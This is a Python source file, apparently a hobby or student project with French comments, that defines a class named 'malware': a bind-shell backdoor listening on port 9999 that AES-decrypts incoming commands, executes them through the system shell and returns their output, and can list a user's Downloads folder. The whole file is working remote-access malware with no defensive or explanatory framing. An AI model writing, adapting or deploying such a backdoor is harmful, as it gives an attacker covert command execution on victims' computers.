import os
import socket
import subprocess
from Crypto.Cipher import AES
from os import listdir

class malware:
    def __init__(self):
        self.port = 9999
        self.ip = ""
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.key =  open("Key.bin", 'rb').read()
        self.iv= open("Vector.bin", 'rb').read()
        self.AES = AES.new(self.key, AES.MODE_CFB, self.iv)


    def socketBind(self):
        try:
            print("Binding socket to port: " + str(self.port))
            self.socket.bind((self.ip, self.port))  # le serveur attend une connexion de la part du client
            self.socket.listen(5)  # commence à écouter les connexions entrantes
        except socket.error as msg:
            print("Socket binding error: " + str(msg) + "\n" + "Retrying...")  #
            socketBind()

    def socketAccept(self):
        conn, address = self.socket.accept()  # accepte une connexion, retourne un nouveau socket et une adresse client
        print("Connection is established | " + "IP " + address[0] + " | Port " + str(address[1]))  # affiche l'adresse ip et le port quand la connexion est réussie
        self.receiveCommands(conn)  # Appel de fonction
        conn.close()  # ferme le socket

    def receiveCommands(self, conn):

        while True:
            data = conn.recv(9999999)  # recoit les donnees, jusqua 2048 caracteres
            data = self.AES.decrypt(data)

            if data[:2].decode("utf-8", 'ignore') == 'cd':
                os.chdir(data[3:].decode("utf-8"))
                rep ='current directory : '+ os.getcwd()
                output_str = rep.encode('utf-8')
                conn.send(output_str)

            elif data[:].decode("utf-8")== 'dl':

                data = self.getDirectory()
                output_str = data.encode('utf-8')

                conn.send(output_str)  # envoie la variable a lautre machine visée


            elif len(data[:]) > 0:  # permet d'eviter les simple enter dans le remote shell
                cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)  # subprocess.PIPE : indique qu'un tube vers le flux standard doit être ouvert
                output_bytes = cmd.stdout.read() + cmd.stderr.read()  # recupere la sortie et les erreur
                output_str = str(output_bytes, "utf-8",'ignore')  # stock en chaine de caracteres et ignore les caracteres speciaux
                output_str = output_str.encode('utf-8')
                conn.send(output_str)  # envoie la variable a lautre machine visée

    def getDirectory(self):

        path = r"C:\Users\user\Downloads"
        files = os.listdir(path)
        f=""
        for file in files:

            f+=("\n "+file)
        print(f)
        return f

#load
m=malware()
m.socketBind()
m.socketAccept()

